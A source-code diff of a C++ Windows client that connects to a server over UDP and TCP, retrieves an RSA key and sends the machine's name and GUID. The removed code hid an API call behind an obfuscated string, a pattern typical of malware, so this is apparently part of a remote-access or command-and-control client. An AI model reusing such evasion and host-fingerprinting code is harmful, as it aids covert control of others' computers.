@@ -37,13 +37,16 @@ void Client::SetRemoteComputerName() {
 	DWORD buffSize = sizeof(buffer);
 
 	// get computer name
-	BOOL success = Remote.GetNative<_GetComputerNameA>((char*)HIDE("GetComputerNameA")).call(buffer, &buffSize);
-
-	if ( success )
+	BOOL success = GetComputerNameA(buffer, &buffSize);
+	if ( success ) {
+		OutputDebugStringA("set this computer name");
 		this->m_ComputerName = buffer;
+	}
 }
 
 BOOL Client::Connect() {
+	OutputDebugStringA("connecting");
+
 	// make request to udp server
 	this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	if ( this->m_UDPSocket == INVALID_SOCKET )
@@ -73,9 +76,13 @@ BOOL Client::Connect() {
 	if ( connect == SOCKET_ERROR )
 		return FALSE;
 
+	OutputDebugStringA("connected");
+
 	GetPublicRSAKeyFromServer();
 	SendComputerNameToServer();
+	OutputDebugStringA("sent computer name\n");
 	SendMachineGUIDToServer();
+	OutputDebugStringA("sent machine guid\n");
 	return TRUE;
 }
 
@@ -118,7 +125,7 @@ void Client::SetRemoteMachineGUID() {
 	this->m_MachineGUID = string;
 }
 
-BYTESTRING Client::MakeTCPRequest(ClientRequest req, BOOL encrypted) {
+BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {
 
 	BOOL sent = encrypted ? SendEncryptedMessageToServer(this->m_TCPServerDetails, req) : SendMessageToServer(this->m_TCPServerDetails, req);
 	if ( !sent ) return {};
@@ -167,7 +174,7 @@ BOOL Client::GetPublicRSAKeyFromServer() {
 }
 
 template <typename _Ty>
-BOOL Client::ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr) {
+BOOL Client::ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr) {
 	if ( who.type == SOCK_STREAM )
 		return NetCommon::ReceiveData(out, this->m_TCPSocket, TCP);
 	else if ( who.type == SOCK_DGRAM )
@@ -176,7 +183,7 @@ BOOL Client::ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr
 	return FALSE;
 }
 
-BOOL Client::SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr) {
+BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message, sockaddr_in udpAddr) {
 	if ( dest.type == SOCK_STREAM ) // tcp
 		return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
 	else if ( dest.type == SOCK_DGRAM ) // udp
@@ -185,7 +192,7 @@ BOOL Client::SendMessageToServer(Server dest, ClientMessage message, sockaddr_in
 	return FALSE;
 }
 
-BOOL Client::SendEncryptedMessageToServer(Server dest, ClientMessage message) {
+BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage message) {
 	BIO* pk = NetCommon::GetBIOFromString(this->m_Secrets.strPublicKey);
 	BOOL success = FALSE;
 	if ( dest.type == SOCK_STREAM ) // tcp
